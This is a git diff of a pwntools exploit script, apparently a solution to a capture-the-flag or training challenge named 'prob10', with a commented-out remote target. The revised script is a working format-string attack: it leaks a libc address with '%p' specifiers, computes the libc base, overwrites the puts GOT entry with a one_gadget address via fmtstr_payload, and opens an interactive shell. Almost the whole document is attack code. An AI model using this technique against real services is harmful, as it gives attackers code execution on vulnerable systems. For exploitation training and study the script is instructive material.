@@ -1,33 +1,38 @@
 from pwn import *
 import subprocess
 context.terminal=['tmux', 'splitw', '-h']
-def one_gadget():
+def get_one_gadgets():
   return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', './libc.so.6']).decode().split(' ')]
 
 
-p = process("./prob10")
-#p = remote("fsi.zzado.kr", 9940)
-e = ELF("./prob10")
+#p = remote('fsi.zzado.kr', 9940)
+p = process('./prob10')
+e = ELF('./prob10')
 lib = ELF('./libc.so.6')
-printf_got = e.symbols['printf']
-printf_lib = lib.symbols['printf']
-log.info(f'printf(prob) : {hex(printf_got)}')
-log.info(f'printf(libc) : {hex(printf_lib)}')
-log.info(f'offset : {hex(abs(printf_got - printf_lib))}')
+
 puts_got = e.got['puts']
-puts_plt = e.plt['puts']
-leak_data = abs(printf_got - printf_lib)
-leak_base = leak_data 
-
-ogt_offset = one_gadget()
-print(ogt_offset)
-
-
-p.recvuntil('[1]')
-payload = b'%p '*15
-p.send(payload)
-p.recv()
 
 context.bits = 64
+
+p.recv()
+p.send(b'%p %p %p %p %p')
+
+dl_fini = p.recv().split(b' ')
+dl_fini = int(dl_fini[4][:-3], 16)
+log.info(f'dl_fini : {hex(dl_fini)}')
+
+libc_base = dl_fini - 0x237040
+
+ogt_offset = get_one_gadgets()
+one_gadget = libc_base + ogt_offset[0]
+log.info(f'libc_base : {hex(libc_base)}')
+log.info(f'one_gadget : {hex(one_gadget)}')
+
+Writes = {puts_got: one_gadget}
+
+payload = b''
+payload += fmtstr_payload(6, Writes)
+
+p.send(payload)
 
 p.interactive()
